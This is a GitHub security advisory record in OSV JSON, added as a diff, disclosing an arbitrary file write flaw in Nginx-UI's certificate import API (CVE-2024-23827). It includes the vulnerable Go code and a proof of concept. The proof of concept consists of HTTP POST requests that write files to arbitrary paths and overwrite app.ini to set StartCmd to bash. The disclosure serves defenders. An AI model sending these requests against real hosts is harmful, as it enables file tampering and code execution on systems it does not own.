@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-xvq9-4vpv-227m",
+  "modified": "2024-07-26T21:45:30Z",
+  "published": "2024-01-29T22:30:18Z",
+  "aliases": [
+    "CVE-2024-23827"
+  ],
+  "summary": "Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature",
+  "details": "### Summary\n\nThe Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.\n\nhttps://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72\n\n```go\nfunc AddCert(c *gin.Context) {\n\tvar json struct {\n\t\tName                  string `json:\"name\"`\n\t\tSSLCertificatePath    string `json:\"ssl_certificate_path\" binding:\"required\"`\n\t\tSSLCertificateKeyPath string `json:\"ssl_certificate_key_path\" binding:\"required\"`\n\t\tSSLCertificate        string `json:\"ssl_certificate\"`\n\t\tSSLCertificateKey     string `json:\"ssl_certificate_key\"`\n\t\tChallengeMethod       string `json:\"challenge_method\"`\n\t\tDnsCredentialID       int    `json:\"dns_credential_id\"`\n\t}\n\tif !api.BindAndValid(c, &json) {\n\t\treturn\n\t}\n\tcertModel := &model.Cert{\n\t\tName:                  json.Name,\n\t\tSSLCertificatePath:    json.SSLCertificatePath,\n\t\tSSLCertificateKeyPath: json.SSLCertificateKeyPath,\n\t\tChallengeMethod:       json.ChallengeMethod,\n\t\tDnsCredentialID:       json.DnsCredentialID,\n\t}\n\n\terr := certModel.Insert()\n\n\tif err != nil {\n\t\tapi.ErrHandler(c, err)\n\t\treturn\n\t}\n\n\tcontent := &cert.Content{\n\t\tSSLCertificatePath:    json.SSLCertificatePath,\n\t\tSSLCertificateKeyPath: json.SSLCertificateKeyPath,\n\t\tSSLCertificate:        json.SSLCertificate,\n\t\tSSLCertificateKey:     json.SSLCertificateKey,\n\t}\n\n\terr = content.WriteFile()\n\n\tif err != nil {\n\t\tapi.ErrHandler(c, err)\n\t\treturn\n\t}\n\n\tc.JSON(http.StatusOK, Transformer(certModel))\n}\n\n```\nhttps://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15\n\n```go\nfunc (c *Content) WriteFile() (err error) {\n\t// MkdirAll creates a directory named path, along with any necessary parents,\n\t// and returns nil, or else returns an error.\n\t// The permission bits perm (before umask) are used for all directories that MkdirAll creates.\n\t// If path is already a directory, MkdirAll does nothing and returns nil.\n\n\terr = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)\n\tif err != nil {\n\t\treturn\n\t}\n\n\terr = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tif c.SSLCertificate != \"\" {\n\t\terr = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t}\n\n\tif c.SSLCertificateKey != \"\" {\n\t\terr = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)\n\t\tif err != nil {\n\t\t\treturn\n\t\t}\n\t}\n\n\treturn\n}\n```\n\n\n### PoC\n\n```\nPOST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 144\nAccept: application/json, text/plain, */*\nAuthorization: <JWT>\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/tmp/test\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"test\",\"ssl_certificate_key\":\"test2\"}\n```\n\n```bash\nroot@aze:~/nginx# ls -la /tmp/test*\n-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test\n-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2\n```\n\nIt's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.\n\n```bash\nroot@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = login\n```\nThen we overwrite the `StartCmd` with `bash`\n\n```\nPOST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 980\nAccept: application/json, text/plain, */*\nAuthorization: <JWT>\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/root/nginx/app.ini\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"[server]\\r\\nHttpHost          = 0.0.0.0\\r\\nHttpPort          = 9000\\r\\nRunMode           = debug\\r\\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\\r\\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\\r\\nHTTPChallengePort = 9180\\r\\nEmail             = props@pros.com\\r\\nDatabase          = database\\r\\nStartCmd          = bash\\r\\nCADir             = dqsdqsd\\r\\nDemo              = false\\r\\nPageSize          = 10\\r\\nGithubProxy       = dqsdqfsdfsdfsdfsd\\r\\n\\r\\n[nginx]\\r\\nAccessLogPath =\\r\\nErrorLogPath  =\\r\\nConfigDir     =\\r\\nPIDPath       =\\r\\nTestConfigCmd =\\r\\nReloadCmd     =\\r\\nRestartCmd    =\\r\\n\\r\\n[openai]\\r\\nBaseUrl = \\r\\nToken   =\\r\\nProxy   =\\r\\nModel   = \\r\\n\\r\\n[casdoor]\\r\\nEndpoint     =\\r\\nClientId     =\\r\\nClientSecret =\\r\\nCertificate  =\\r\\nOrganization =\\r\\nApplication  =\\r\\nRedirectUri  =\",\"ssl_certificate_key\":\"test2\"}\n```\n\n```bash\nroot@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = bash\n```\n\nFor the new config to be applied the app needs to be restarted\n\n![image](https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png)\n\n\n\n### Impact\n\nArbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/0xJacky/Nginx-UI"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.0-beta.12"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23827"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/0xJacky/nginx-ui"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-01-29T22:30:18Z",
+    "nvd_published_at": "2024-01-29T16:15:09Z"
+  }
+}
